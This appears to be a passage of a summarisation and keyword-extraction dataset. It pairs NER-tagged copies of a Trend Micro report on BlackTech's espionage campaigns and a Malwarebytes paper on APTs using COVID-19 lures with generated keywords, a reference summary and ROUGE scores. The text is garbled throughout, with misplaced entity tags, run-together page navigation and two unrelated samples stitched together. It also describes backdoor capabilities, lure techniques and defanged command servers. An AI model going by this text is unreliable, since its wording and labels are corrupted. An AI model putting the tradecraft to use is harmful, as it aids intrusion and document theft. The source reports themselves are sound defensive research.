CVE-2014 - 6352 , patched by [ORG] Microsoft [DATE] last October , [DATE] 2014 CVE-2017 - 0199 , patched by [ORG] Microsoft [DATE] last [DATE] April , 2017PLEAD also dabbled with a short - lived , fileless version of their malware when it obtained an exploit for a [NORP] Flash vulnerability ( CVE-2015 - 5119 ) that was leaked during [ORG] the [ORG] Hacking [ORG] Team breach . Featured StoriesIIS [CARDINAL] 6.0 [WORK_OF_ART] Vulnerability [WORK_OF_ART] Leads [WORK_OF_ART] to [WORK_OF_ART] Code [WORK_OF_ART] ExecutionWinnti Abuses GitHub for [ORG] C&C [ORG] CommunicationsMajikPOS [ORG] Combines [ORG] PoS [ORG] Malware and RATs to [ORG] Pull [ORG] Off its Malicious [ORG] TricksNew Linux Malware Exploits CGI VulnerabilityCVE-2017 - 5638 : Apache Struts 2 Vulnerability Leads to Remote Code ExecutionBusiness Process CompromiseAttackers are starting to invest in long- term operations that target specific processes enterprises rely on . They scout for vulnerable practices , susceptible systems and operational loopholes that they can leverage or abuse . To learn more , read our Security 101 : [ORG] Business [ORG] Process [ORG] Compromise . Business Email [ORG] CompromiseHow can a sophisticated email scam cause [MONEY] more [MONEY] than $ 2.3 [MONEY] billion in damages to businesses around the world ? See the numbers behind BECLatest Ransomware [ORG] PostsAdGholas [ORG] Malvertising [ORG] Campaign [ORG] Employs [ORG] Astrum Exploit [ORG] KitErebus [ORG] Resurfaces as [PERSON] Linux [PERSON] RansomwareAnalyzing the Fileless , Code - injecting SOREBRECT RansomwareVictims Lost US$ [MONEY] 1B to [ORG] RansomwareAfter [ORG] WannaCry , [ORG] UIWIX [ORG] Ransomware and Monero - Mining [ORG] Malware [ORG] Follow [ORG] SuitRecent [ORG] PostsFollowing the Trail of [ORG] BlackTech \u2019s Cyber Espionage CampaignsAdGholas Malvertising Campaign Employs Astrum Exploit [ORG] KitErebus [ORG] Resurfaces as [PERSON] Linux [PERSON] RansomwareYour email hereSubscribeFigure [CARDINAL] 1 : How PLEAD utilizes compromised routersThis infographic shows how ransomware has evolved , how big the problem has become , and ways to avoid being a ransomware victim . Check the infographicNew post : Following the Trail of [ORG] BlackTech \u2019s Cyber Espionage Campaigns bit.ly/2rZ2RLz [TIME] @TrendMicro [TIME] about [TIME] 4 [TIME] hours agoAnalyzing the [NORP] Fileless , Code - injecting SOREBRECT RansomwareAnalyzing Xavier : [ORG] An [ORG] Information - Stealing [ORG] Ad [ORG] Library on [ORG] AndroidMouse [ORG] Over , Macro : [PERSON] Spam [PERSON] Run in [LOC] Europe Uses Hover Action to Deliver Banking TrojanErebus Resurfaces as Linux Ransomware#Erebus ransomware resurfaces , takes the spotlight in our latest # ransomware recap . bit.ly/2tQHfTcAnalyzing the Fileless , Code - injecting SOREBRECT RansomwareMicrosoft Patches Windows XP Again As Part of June Patch Tuesdayabout [TIME] 6 [TIME] hours agoStay [ORG] UpdatedMassive [ORG] WannaCry / Wcry Ransomware Attack Hits Various CountriesAre cities ready to roll out # [ORG] IoT on a massive scale ? bit.ly/2rrdJ6vRansomware [CARDINAL] 101Popular PostsLatest Tweetsabout [TIME] 3 [TIME] hours agoEmail [PERSON] SubscriptionPLEAD actors use a router scanner tool to scan for vulnerable routers , after which the attackers will enable the router \u2019s VPN feature then register a machine as virtual server . This virtual server will be used either as a [ORG] C&C server or an HTTP server that delivers [ORG] PLEAD malware to their targets . [ORG] PLEAD also uses CVE-2017 - 7269 , a buffer overflow vulnerability [ORG] Microsoft [ORG] Internet [ORG] Information [ORG] Services ( IIS ) [CARDINAL] 6.0 to compromise the victim \u2019s server . This is another way for them to establish a new [ORG] C&C or HTTP server . Figure [CARDINAL] 2 : [CARDINAL] One of the methods [ORG] PLEAD operators use to distribute their malwarePLEAD \u2019s backdoor can : Harvest saved credentials from browsers and email clients like Outlook List drives , processes , open windows , and files Open remote [ORG] Shell [ORG] Upload target file Execute applications via [PRODUCT] ShellExecute [PRODUCT] API [PRODUCT] Delete target [NORP] filePLEAD also uses the document - targeting exfiltration tool [ORG] DRIGO , which mainly searches the infected machine for documents . Each copy of [ORG] DRIGO contains a refresh token tied to specific [PERSON] Gmail accounts used by the attackers , which are in turn linked to [PRODUCT] a [PRODUCT] Google [PRODUCT] Drive account . The stolen files are uploaded to [PRODUCT] these [PRODUCT] Google [PRODUCT] Drives , where the attackers can harvest them . Shrouded Crossbow This campaign , [ORDINAL] first observed in [DATE] 2010 , is believed to be operated by a well - funded group given how it appeared to have purchased the source code of the BIFROST backdoor , which the operators enhanced and created other tools from . [PERSON] Shrouded [PERSON] Crossbow targeted privatized agencies and government contractors as well as enterprises in the consumer electronics , computer , healthcare , and financial industries . [PERSON] Shrouded [PERSON] Crossbow employs [CARDINAL] three BIFROST - derived backdoors : [ORG] BIFROSE , [ORG] KIVARS , and [ORG] XBOW . Like [ORG] PLEAD , [PERSON] Shrouded [PERSON] Crossbow uses spear - phishing emails with backdoor - laden attachments that utilize the [FAC] RTLO technique and accompanied by decoy documents . [ORG] BIFROSE , known for evading detection by communicating with its [ORG] C&C servers via Tor protocol , also has a version targeting UNIX - based operating systems , which are usually used in servers , workstations , and mobile devices . [ORG] KIVARS has less functionality than [ORG] BIFROSE , but its modularstructure made it easier to maintain . [ORG] KIVARS enabled attackers to download and execute files , list drives , uninstall malware service , take screenshots , activate / deactivate keylogger , show / hide active windows , and trigger mouse clicks and keyboard inputs . A [CARDINAL] 64 - bit version of [ORG] KIVARS also emerged to keep pace with the popularity of [CARDINAL] 64 - bit systems . XBOW \u2019s capabilities are derived from [ORG] BIFROSE and [ORG] KIVARS ; [PERSON] Shrouded [PERSON] Crossbow gets its name from its unique mutex format . [DATE] Waterbear [DATE] Waterbear has actually been operating for a long time . The campaign \u2019s name is based on its malware \u2019s capability to equip additional functions remotely . Waterbear similarly employs a modular approach to its malware . A loader component executable will connect to the [ORG] C&C server to download the main backdoor and load it in memory . A later version of this malware appeared and used patched server applications as its loader component , while the main backdoor is either loaded from an encrypted file or downloaded from the [ORG] C&C server . The tactic it later adopted required prior knowledge of their targets \u2019 environment . It \u2019s possible attackers used Waterbear as a secondary payload to help maintain presence after gaining some levels of access into the targets \u2019 systems . All Roads Lead to [ORG] BlackTech [ORG] Based on the use of the same [ORG] C&C servers , the campaigns \u2019 coordinated efforts , and similarities in tools , techniques , and objectives , we can conclude that they are operated by the same group . It is not uncommon , for instance , for a group \u2014 especially a well - funded [CARDINAL] one \u2014 to split into teams and run multiple campaigns . While most of the campaigns \u2019 attacks are conducted separately , we \u2019ve seen apparently joint operations conducted in phases that entail the work of different teams at each point in the infection chain . Use of the Same C&C Servers . In several instances , we found the campaigns \u2019 malware communicating with the same [ORG] C&C servers . In targeted attacks , [ORG] C&C servers are typically not shared with other groups . Here are some of the [ORG] C&C servers we found that are shared by the campaigns : [ORG] C&C Serveritaiwans[.]commicrosoftmse[.]comPLEADShrouded CrossbowWaterbearYesYesNoYesYesNo211[.]72[.]242[.]120 No Table 1 : [ORG] C&C servers shared by [ORG] PLEAD , [PERSON] Shrouded [PERSON] Crossbow , and WaterbearYesYesAdditionally , the [ORG] IP 211[.]72 [ .]242[.]120 is one of the hosts for the domain microsoftmse[.]com , which has been used by several [ORG] KIVARS variants . [ORG] Joint [ORG] Operations . We also found incidents where the backdoors were used on the same targets . While it \u2019s possible for separate groups to attack at the same time , we can construe at they are at least working together : PLEADShrouded [PRODUCT] CrossbowSamples from the same group using the same filenameLoader component named after its target , i.e. { target name}.exeLoader component named after its target , i.e. { target [ORG] name}.exe or { target name}64.exeBackdoors using the same [ORG] C&C serversConnected to [CARDINAL] 211[.]72[.]242[.]120:53Connected to [CARDINAL] 211[.]72[.]242[.]120:443Timeline indicating arrival orderArrived [DATE] two [DATE] days after initial infection by [ORG] SCEstablished presence [DATE] two [DATE] years prior , but re - infected at a recent timeTable [CARDINAL] 2 : Incident where [ORG] PLEAD and [ORG] KIVARS attack the same [PERSON] targetPLEADvmdks.exeShrouded Crossbowcfbcjtqx.dllSamples found in same machineTimeline of infection3/16/20172/23/2017Waterbeartpauto.dll3/8/2017Table [CARDINAL] 3 : Incidents where [ORG] PLEAD , [ORG] KIVARS , and [ORDINAL] Waterbear were used on the same targetSimilarities between tools and techniques . [ORG] PLEAD and [ORG] KIVARS , for instance , share the use of RTLO techniques to disguise their installers as documents . Both also use decoy documents to make the [FAC] RTLO attack more convincing . Another similarity is the use of a small loader component to load encrypted backdoors into memory . Similar Objectives . The ulterior motive of these campaigns is to steal important documents from their victims ; initial recipients of their attacks are not always their primary target . For instance , we saw several decoy documents stolen by the attackers that are then used against another target . This indicates that document theft is most likely the [ORDINAL] first phase of an attack chain against a victim with ties to the intended target . While [ORG] PLEAD and [ORG] KIVARS are most likely to be used in [ORDINAL] first phase attacks , Waterbear can be seen as a [ORDINAL] secondary backdoor installed after attackers have gained a certain level ofprivilege . Based on the type of documents stolen by these campaigns , we can get a clearer view of who they \u2019re targeting and compromising , the purpose of their campaigns , and when they take place . Below are some of the categories or labels of the stolen documents : Address book Human affairsInternal affairs [PERSON] ScheduleEnterprises [PERSON] Need to be Proactive PLEAD , [PERSON] Shrouded [PERSON] Crossbow , and Waterbear are still actively mounting their campaigns against its targets , which is why organizations must proactively secure their perimeter . IT / system administrators and information security professionals can consider making a checklist of what to look out for in the network for any signs of anomalies and suspicious behavior that can indicate intrusions . Adopting best practices and employing multilayered security mechanisms and strategies against targeted attacks are also recommended . Network traffic analysis , deployment of firewalls and intrusion detection and prevention systems , network segmentation , and data categorization are just some of them . [ORG] Trend [ORG] Micro [ORG] SolutionsTrend [ORG] Micro \u2122 Deep Discovery \u2122 provides detection , in - depth analysis , and proactive response to [DATE] today \u2019s stealthy malware , and targeted attacks in real - time . It provides a comprehensive defense tailored to protect organizations against targeted attacks and advanced threats through specialized engines , custom sandboxing , and seamless correlation across the entire attack lifecycle , allowing it to detect threats like the above mentioned zero - day attacks even without any engine or pattern update . [ORG] Trend [ORG] Micro \u2122 [ORG] Deep [ORG] Security \u2122 and [ORG] Vulnerability [ORG] Protection provide virtual patching that protects endpoints from threats that abuses unpatched vulnerabilities . OfficeScan \u2019s [ORG] Vulnerability [ORG] Protection shield endpoints from identified and unknown vulnerability exploits even before patches are deployed . [ORG] Trend [ORG] Micro \u2122 [ORG] Smart [ORG] Protection [ORG] for [ORG] Endpoints [ORG] with [ORG] Maximum [ORG] XGen \u2122 security infuses high - fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across user activity and any endpoint \u2014 the broadest possible protection against advanced attacks . An overview and analysis of the various malware used by [ORG] PLEAD , [PERSON] Shrouded [PERSON] Crossbow , and [ORDINAL] Waterbear , along with their Indicators of Compromise ( hashes , C&Cs ) , can be found in this technical brief . Related Posts : BLACKGEAR Espionage Campaign Evolves , Adds [ORG] Japan [ORG] To Target List How Cyber Propaganda Influenced Politics in [DATE] 2016 Can Internet of Things be [ORG] the [ORG] New [ORG] Frontier [ORG] for [ORG] Cyber [ORG] Extortion ? What \u2019s In [GPE] Shodan ? Analyzing Exposed Cyber Assets in [ORG] the [ORG] United [ORG] StatesLearn how to protect Enterprises , [ORG] Small [ORG] Businesses , and [PERSON] Home [PERSON] Users from ransomware : ENTERPRISE\u00bbSMALL BUSINESS\u00bbHOME\u00bbTags : BlackTechcyber espionageShrouded [ORG] CrossbowPLEADWaterbearHOME [ORG] AND [ORG] HOME [ORG] OFFICE [ORG] |FOR [ORG] BUSINESS |SECURITY [PERSON] INTELLIGENCE [PERSON] |ABOUT [PERSON] TREND MICROAsia Pacific Region ( [ORG] APAC ): [GPE] Australia / [GPE] New [GPE] Zealand , , [GPE] \u2f47 , \ub300\ud55c\ubbfc\uad6d ,   [LOC] Europe , [LOC] Middle [LOC] East , & Africa Region ( EMEA ): [GPE] France , [ORG] Deutschland [ORG] / [ORG] \u00d6sterreich [ORG] / [ORG] Schweiz , [GPE] Italia , \u0420\u043e\u0441\u0441\u0438\u044f , [GPE] Espa\u00f1a , [GPE] United [GPE] Kingdom / [LOC] IrelandLatin [LOC] America [LOC] Region ( LAR ): Brasil , [LOC] M\u00e9xicoNorth [LOC] America [LOC] Region ( [ORG] NABU ): [GPE] United [GPE] States , CanadaPrivacy StatementLegal PoliciesCopyright \u00a9 [CARDINAL] 2017 [ORG] Trend [ORG] Micro [ORG] Incorporated . All rights reserved .", "generated_text": "BlackTech; campaigns; information theft; Taiwanese government agencies; private organizations; 2012; spear-phishing emails; DRIGO exfiltration; documents; links; cloud storage services; drop off points; exfiltrated documents; exploits; Adobe; Adobe; GitHub; SAF; the malware; exploits; RATs; a short-lived, fileless version; a Flash vulnerability; exploits; a Flash vulnerability; May; Kaspersky; C2; the threat actor; GitHub; a variety; techniques; targets; Asia.", "ref_text": "<START-1>The PDF describes the cyberespionage campaigns of a group called BlackTech, which has targeted organizations in East Asia, particularly Taiwan. BlackTech is connected to three malware campaigns - PLEAD, Shrouded Crossbow, and Waterbear. PLEAD has been active since 2012, targeting government agencies and private companies in Taiwan. It uses spearphishing emails to deliver malware that can harvest credentials and documents. Shrouded Crossbow emerged in 2010 and purchased hacking tools to enhance. It targeted companies in various industries globally. Waterbear is an older campaign that uses modular malware which can be updated remotely. Analysis of the campaigns' tactics, techniques, objectives, and infrastructure links them to the same group - BlackTech. The campaigns share some of the same command and control servers. In some cases, different malware from the campaigns infected the same targets in coordinated phases. The malware uses similar techniques like disguising installers as documents. The campaigns' goal is to steal sensitive documents from targets. The type of documents stolen provides insights into BlackTech's targets - government agencies and companies in sectors like defense, technology, and more. The report recommends organizations employ layered security solutions and be proactive to detect signs of intrusion. It provides an overview of Trend Micro's security offerings that can help defend against such targeted attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.41071428571428575, "gpt3/lexical/rouge_rouge2": 0.14970059880239522, "gpt3/lexical/rouge_rougeL": 0.2678571428571429, "gpt3/lexical/rouge_rougeLsum": 0.2678571428571429, "gpt3_generated_text": ["This article discusses the cyber espionage campaigns conducted by a group known as BlackTech, targeting organizations in East Asia, particularly Taiwan. The group has been active since 2012 and has targeted Taiwanese government agencies and private organizations. The campaigns involve the use of spear-phishing emails to deliver a backdoor and exfiltration tools. The group also utilizes exploits for vulnerabilities in software such as Adobe and Microsoft. The article suggests that the campaigns conducted by BlackTech, including PLEAD, Shrouded Crossbow, and Waterbear, may be operated by the same group based on common denominators. The group has also experimented with a fileless version of their malware. The article highlights the importance of analyzing the tactics and techniques used by threat actors to uncover connections and understand their motives."]}, {"split_name": "val", "sample_id": "val_22", "prompt_text": "Extract the keywords: [ORG] WHITE [ORG] PAPERAPTs and [PERSON] COVID-19 : use the coronavirus as a lure Malwarebytes Threat Intelligence [DATE] April [DATE] 2020Table of contents Introduction : APT groups using COVID-19 [CARDINAL] 3 Template injection [CARDINAL] 4 Malicious macros [CARDINAL] 10 Kimsuky 10 [NORP] Konni ( APT37 ) [CARDINAL] 11 Ocean Lotus [CARDINAL] 19 [ORG] RTF exploit [CARDINAL] 20 [ORG] Calypso [ORG] Group [CARDINAL] 20 [NORP] Chinese actor ( [ORG] Winnti ) [CARDINAL] 21 Malicious [ORG] LNK files [CARDINAL] 22 [PERSON] Mustang [PERSON] Panada [CARDINAL] 22 [ORG] APT groups using COVID-19 Coronavirus ( COVID-19 ) has become a global pandemic , upending economies , livelihoods , schools and hospital systems \u2014 nearly every facet of everyday life has been touched . Such uncertainty and fear surrounding the virus and its impact represents a golden opportunity for threat actors to exploit the situation . By using social engineering tactics such as spam and spear phishing campaigns with [PERSON] COVID-19 as a lure , cybercriminals and threat actors increase the likelihood of successful attack . In this paper , we provide an overview of several different [ORG] APT groups using coronavirus as a lure , as well as a description of their varied attack vectors . We categorize the [ORG] APT groups according to the technique they used to send spam or phishing emails : Template injection , Malicious macros , RTF exploits , and malicious [ORG] LNK files . From [DATE] late [DATE] January on , several cybercriminal and state- sponsored groups have been doing just that , using coronavirus - themed phishing emails as their infection vector to gain a foothold on victim machines . Just like the coronavirus itself , [GPE] China was the [ORDINAL] first target of [ORG] Advanced [ORG] Persistent [ORG] Threat ( [ORG] APT ) groups , and as the virus spread worldwide , so did the cyberattacks . Once their victims \u2019 attention was captured by social engineering , threat actors used various techniques to deploy malware , such as embedding macros in [ORG] Microsoft documents attached to phishing emails or exploiting system or browser vulnerabilities to drop malicious software . APTs and COVID-19 : How advanced persistent threats use the coronavirus as a lure3 33Template injection Template injection refers to a technique in which threat actors embed a script moniker in the lure document \u2014 usually a [ORG] Microsoft [ORG] Office document \u2014 that contains a link to a malicious [ORG] Office template via an XML setting . Upon opening the document , the remote template is dropped and executed . [ORG] Kimsuky and [GPE] Gamaredon are examples of APTs using template injection . [ORG] Kimsuky [ORG] Kimsuky ( also known as [PERSON] Velvet [PERSON] Chollima ) is a North- [NORP] Korean threat actor group that has been active since [DATE] 2013 and is known to be behind the [ORG] KHNP ( [ORG] Korea [ORG] Hydro [ORG] & [ORG] Nuclear [ORG] Power ) cyber terrorism attacks of [DATE] 20141 . The group mainly targets [NORP] Korean think tanks , DPRK / nuclear- related targets , and several [GPE] US firms with the main goal of delivering malicious payloads to its targets and stealing web application accounts . Starting in [DATE] early [DATE] March [DATE] 2020 , [ORG] Kimsuky began using spear phishing emails with COVID-19 in the subject line as its initial infection vector . The emails contain malicious documents weaponized with CVE-2017 - 01992 . This vulnerability allows remote code execution by exploiting a flaw in the [ORG] Microsoft [ORG] Office [ORG] OLE interface to deliver malware . Upon opening the document , a prompt asks victims to \u201c enable content \u201d to show information about the coronavirus . Figure [CARDINAL] 2 : Malcious document after enabling contentAfter enabaling the content , a script moniker \u201c in word/_rels / setting[.]xml[.]rels \u201d is triggered and drops a [ORG] Microsoft document template called web.dotm from the following url : url Templetes / normal.php?name = webFigure [CARDINAL] 1 : Malicious document used as a lureFigure [CARDINAL] 3 : [ORG] setting.xml.rels content4The \u201c web.dotm \u201d has an embedded macro which is designed to target [PERSON] Mac users ( Figure [CARDINAL] 4 ) . This macro also runs on Windows OS , however , it only executes its main malicious functionality on a Mac . There is an \u201c If statement \u201d that checks the operating system and executes a remote Python script called \u201c Secured . APP\u201d . Figure [CARDINAL] 4 : Malicious macro embedded in web.dotmFigure [CARDINAL] 5 shows the content of \u201c Secured . [ORG] APP \u201d , which executes the [ORDINAL] second stage Python script . Based on the directory information provided in this script , it seems it is targeting users with [ORG] Microsoft [ORG] Office version [DATE] 2016 or earlier . Figure [CARDINAL] 5 : Secured . APP5The [ORDINAL] second payload , as depicted in Figure [CARDINAL] 7 , is spyware that collects information by running several commands and sending the collected data to its [ORG] C&C server . The main function is \u201c [PRODUCT] SpyLoop \u201d , which collects and sends device / user information in an infinite while loop . The list of collected information , stored in separate files ( Figure [CARDINAL] 6 ) , is as follows : \u2022 Architecture info \u2022 System infoExternal network info Firewall\u2022 [PERSON] Apple [PERSON] Pay [PERSON] Language and region [PERSON] List of running processes [PERSON] List of installed [WORK_OF_ART] Applications [WORK_OF_ART] List of files in Documents / Downloads / Desktop directory List of volumes [WORK_OF_ART] List [WORK_OF_ART] of [WORK_OF_ART] users\u2022 \u2022Figure [CARDINAL] 6 : Content of collected informationThe directory is then compressed with a password ( \u201c doxujoijcs0qei09213@#$@ \u201d ) and uploaded as a zip file in an http request as shown in Figure [CARDINAL] 7.6Figure [CARDINAL] 7 : [ORDINAL] Second Python scriptThe next function in the loop is \u201c ExecNewCommand \u201d , which is likely used to download additional content . It then sleeps for [TIME] five [TIME] minutes and repeats the same process . At time of writing , it only responded with a \u201c [CARDINAL] 200 OK\u201d . APTs and COVID-19 : How advanced persistent threats use the coronavirus as a lure7 [CARDINAL] 77Gamaredon [GPE] Gamaredon is a [NORP] Russian APT that primarily performs cyber espionage operations against [NORP] Ukrainian military forces , as well as individuals related to the [NORP] Ukrainian government . [GPE] Gamaredon has been active since [DATE] 2013 and often uses spear phishing as its initial infection vector . [DATE] Between [DATE] March [DATE] 23 [DATE] and [DATE] 25 , [GPE] Gamaredon sent phishing emails using the COVID-19 theme and employed remote template injection within their lure , [PERSON] a [PERSON] Microsoft [PERSON] Word document written in [LANGUAGE] Russian . ( Figure [CARDINAL] 8).Upon opening the document , a remote template is dropped from the link provided in the XML setting ( Figure [CARDINAL] 9).We were not able to retrieve this template at time of publishing , but found other similar templates used by [DATE] this [DATE] APT [DATE] days before this campaign and realized they are using similar malicious macros . Figure [CARDINAL] 10 shows an example of such a macro . Instead of executing the malicious behavior upon opening the document ( using the \u201c auto_open \u201d function ) , the malicious macro in this document is executed in the \u201c Document_close \u201d function . This could be to bypass dynamic analysis if the document is not closed before the sandbox times out . The macro collects the computer name , home drive \u2019s label / serial number , and [ORG] BIOS information ( using [ORG] WMI ) and sends it to a hardcoded C2 server with this format : url BiosVersionInfoFigure [CARDINAL] 9 : Template injectionFigure [CARDINAL] 8 : Lure documentAPTs and COVID-19 : How advanced persistent threats use the coronavirus as a lure8 88It then creates a VBS script in the % APPDATA% directory and makes it persistent by copying it into the startup directory . In addition to the mentioned items , the script also collects keyboard layout and country code and checks whether Process explorer or [ORG] Wireshark are running on the system . Figure [CARDINAL] 10 : [ORG] Macro embedded in templateThe [ORG] APT group then drops its custom backdoor \u201c Pterodo \u201d that is capable of downloading other malware variants and collecting sensitive information3.9Malicious [ORG] MacrosEmbedding malicious macros is the most popular method of infection used by APTs . In this attack vector , a macro is embedded in the lure document that will be activated upon its opening . In the following sections , we look at APTs using this method in their [PRODUCT] COVID-19 lure . Kimsuky In the previous section , we mentioned that [ORG] Kimsuky is using template injection to infect [PERSON] Mac users . We also observed this actor using COVID-19 - themed malicious macros to target Windows users mostly in [GPE] South [GPE] Korea4 . ( Figure [DATE] 11):Figure [DATE] 11 : Malicious document targeting [PRODUCT] Windows [PRODUCT] usersAPTs and [PERSON] COVID-19 : How advanced persistent threats use the coronavirus as a lure10 1010The malicious macro is obfuscated , as shown in Figure [CARDINAL] 12 : Figure [CARDINAL] 12 : Malicious obfuscated macroAfter de - obfuscating the script , we can see the value stored in the content variable as : This uses \u201c mshta \u201d to execute a malicious search.hta file from its server . The content variable is then executed by [NORP] Wscript . The \u201c [ORG] Search.hta \u201d contains a script that downloads another script . The downloaded script is spyware that collects sensitive information , such as [ORG] IP addresses , usernames , list of processes , RDP information , and Outlook information and sends it back to the server . Figure [CARDINAL] 13 shows the lure document , named \u201c Keep an eye on [NORP] North [NORP] Korean cyber.doc\u201d:Konni ( APT37 ) [PERSON] Konni is a [NORP] North [NORP] Korean APT that has been active since [DATE] 2012 and is known to target [NORP] South [NORP] Korean organizations in the chemicals , electronics , manufacturing , aerospace , automotive , and healthcare industries . In [DATE] 2017 , the group expanded its operations , targeting organizations in several other countries , such as the [GPE] US , [GPE] Japan , [GPE] Vietnam , [GPE] Russia , [GPE] Nepal , [GPE] China , [GPE] India , [GPE] Romania , [GPE] Kuwait , and countries in [LOC] the [LOC] Middle [LOC] East . Recently , researchers found several communalities between this [ORG] APT and [ORG] Kimsuky , showing there is a close tie between these [CARDINAL] two groups5.Konni is known to use spear phishing emails , strategic web compromises , and torrent file - sharing sites to compromise its victims . In mid - [DATE] March , they began sending spear phishes with COVID-19 warnings , ironically advising readers to watch out for [NORP] North [NORP] Korean cybercrime spikes related to the spread of the virus . Figure [CARDINAL] 13 : Lure document11The embedded macro in this document includes an encrypted executable code that is XOR decoded and stored in the \u201c C\\Users\\UserName\\ \u201d directory ( Figure [CARDINAL] 14 ) . The dropped executable is a downloader for their popular [ORG] Konni [ORG] Remote [ORG] Access [ORG] Trojan ( [ORG] RAT ) downloaded from6 : url [CARDINAL] 14 : Embedded macro12APT36 APT36 is another threat group that has employed macro - embedded COVID-19 themes in their recent campaigns . The group is believed to be [NORP] Pakistani state - sponsored , mainly targeting the defense , embassies , and government of India.7 Their coronavirus attacks began on [DATE] March [DATE] 12 and included phishing emails with attached malicious documents , which dropped [PERSON] Crimson RAT payloads on victim machines . [ORG] Patchwork [ORG] Patchwork , also known as Dropping Elephant , [PERSON] Chinastrats , [ORG] APT - C-09 , and [ORG] Quilted [ORG] Tiger , is an [NORP] Indian threat actor that has been active since [DATE] 2013 . The primary targets of this [ORG] APT are organizations related to diplomatic and government agencies in [GPE] China , [GPE] Japan , [LOC] the [LOC] Middle [LOC] East , the [GPE] UK , the [GPE] US , [GPE] Bangladesh , [GPE] Sri [GPE] Lanka , and [GPE] Pakistan . Patchwork mainly uses spear phishing methods to gain access to victims \u2019 machines . In [DATE] early [DATE] February , Patchwork began sending phishing emails with a COVID-19 theme , using malicious [PRODUCT] Excel documents to target [NORP] Chinese organizations ( Figure [CARDINAL] 15).Figure [CARDINAL] 15 : Lure documentAPTs and COVID-19 : How advanced persistent threats use the coronavirus as a lure1313The embedded macro ( Figure [CARDINAL] 17 ) is simple : It downloads a script from the URL embedded as a formula in column \u201c X \u201d , row \u201c [CARDINAL] 100 \u201d . ( Figure [CARDINAL] 16).Figure [CARDINAL] 16 : Url embedded in the cellFigure [CARDINAL] 17 : [ORG] MacroThe downloaded Scriptlet \u201c window.scr \u201d ( Figure [CARDINAL] 18 ) is responsible for dropping and executing another payload , which is a custom backdoor developed by the actor . Figure [CARDINAL] 18 [ORG] window.scr14Hades [ORG] Hades is the [ORG] APT group behind the attack against [ORG] the [ORG] Pyeongchang [ORG] Winter [ORG] Olympics . Evidence suggests that this group is connected to the well - known [NORP] Russian threat actor APT288.In their recent campaign called [PERSON] Tricky [PERSON] Mouse , [LOC] Hades targeted [GPE] Ukrainian users using [PERSON] COVID-19 lures9 , [CARDINAL] 10 . The attack started by sending a macro - embedded document to victims ( Figure [CARDINAL] 19).The embedded macro ( Figure [CARDINAL] 20 ) decodes and drops a [ORG] RAT executable into the victim \u2019s machine . Figure [CARDINAL] 19 : Hades lure documentFigure [CARDINAL] 20 : Embedded macro15The [ORG] RAT is dropped in the local user directory as \u201c conhost.exe \u201d . That [ORG] RAT is a .NET executable obfuscated by \u201c Eazfuscator.net \u201d ( Figure [DATE] 21):Figure [DATE] 21 : [NORP] Hades RATAfter de - obfuscation . we saw that the [ORG] RAT had several functionalities , such as collecting system and user information , taking screenshots , and logging keystrokes . The \u201c [ORG] Kdaapk \u201d module is responsible for performing [ORG] C&C communications . The C&C URL is hardcoded within this module as you can see in Figure [CARDINAL] 22 : Figure [CARDINAL] 22 : Hades RAT after deobfuscation16TA505 TA505 is an [ORG] APT group that started its activity by distributing the [ORG] Dridex banking [ORG] Trojan on mass scale in [DATE] 201411 . The group is considered unique , as it \u2019s a financially - motivated team of threat actors that uses a wide variety of malware families . Starting on [DATE] March [DATE] 9th , TA505 used malicious macros in their [PERSON] COVID-19 themed documents , which included [ORG] Microsoft [ORG] Excel spreadsheets . Figure [CARDINAL] 23 show such a document after enabling its content : As you can see in Figure [CARDINAL] 24 , upon opening the document , a progress bar dialog box pops up ( UserForm1_show ) . The dialog box is used to confuse the user while the main malicious functionality is located in the popped - up dialog box activate function ( Figure 25).Figure 23 : Lure documentFigure 24 : Embedded macroAPTs and [PERSON] COVID-19 : How advanced persistent threats use the coronavirus as a lure17 1717When the dialog box is popped up , the \u201c UserForm _ Activate ( ) \u201d function is executed , which calls \u201c [PERSON] Nlgebredneh ( ) \u201d function : Figure [CARDINAL] 25 : Trigger function of the dialog boxThe \u201c [PERSON] Nlgebredneh ( ) \u201d function drops \u201c paper.xls \u201d in the \u201c % APPDATA% \u201d temp directory and extracts \u201c oleobject1 . bin \u201d from \u201c paper.xls \u201d . In the next step , it decrypts the content of \u201c oleobject1.bin \u201d into \u201c reinforce.dll \u201d in [LOC] the \u201c % APPDATA%/Microsoft / [LOC] Windows / Templates \u201d directory . Finally , it executes the [ORG] DLL file . Figure [CARDINAL] 26 : The \u201c [WORK_OF_ART] Nlgebredneh \u201d functionThe [ORG] DLL file is a small downloader that decrypts the next payload into memory . The downloader drops additional malware families associated with TA505 , such as banking [NORP] Trojans and RATs.18TA542 TA542 ( [PERSON] Mummy [PERSON] Spider ) is a [LANGUAGE] Russian - speaking threat actor group behind the distribution of [PERSON] Emotet , which was [ORDINAL] first seen in the wild in [DATE] 201412 . At [ORDINAL] first , TA542 used modules from the [ORG] Feodo banking [GPE] Trojan , but over time developed their malware with modular architecture adding new capabilities . Since the emergence of [PERSON] COVID-19 , TA542 has started using coronavirus themes in various email distribution campaigns . Malicious documents distributed by the actor have embedded macros that act as a downloader for [PERSON] Emotet malware13 . [PERSON] Bitter [PERSON] Bitter is suspected to be a south [NORP] Asian [ORG] APT group targeting [GPE] Pakistan and [GPE] China since [DATE] 201514 . According to other security researchers , this group has also used [PERSON] COVID-19 themes to target China15 . Macro - embedded documents distributed by this group download and drop a variant of its custom RAT that has been written in .Net . Unfortunately , we were not able to retrieve any sample related to this campaign . [ORG] Ocean [ORG] Lotus [ORG] APT32 ( [NORP] Ocean lotus , [ORG] Sea [ORG] Lotus ) is [ORG] a [ORG] Vietnamese [ORG] APT that has been active since 2014.The group has targeted private sectors as well as governments and journalists from [GPE] Australia , [GPE] Brunei , [GPE] Cambodia , [GPE] China , [GPE] Germany , [GPE] Indonesia , [GPE] Laos , [GPE] Malaysia , [GPE] Myanmar , [GPE] Philippines , [GPE] Singapore , [GPE] Thailand , the [GPE] US , and [GPE] Vietnam . [ORG] Ocean [ORG] Lotus has used strategic web compromises and spear phishing to gain foothold into victims [ORG] \u2019 [ORG] machines16.Ocean [ORG] Lotus also used malicious macro - embedded documents with COVID-19 themes to target [GPE] China , starting [DATE] February [DATE] 19 . In this attack , the malicious document dropped the \u201c Denis \u201d [WORK_OF_ART] Trojan , a malware family that has been developed by this group17.APTs and [PERSON] COVID-19 : How advanced persistent threats use the coronavirus as a lure19 1919RTF exploit [ORG] RTF is a flexible text format that was introduced by [ORG] Microsoft a long time ago . The flexibility of embedding any 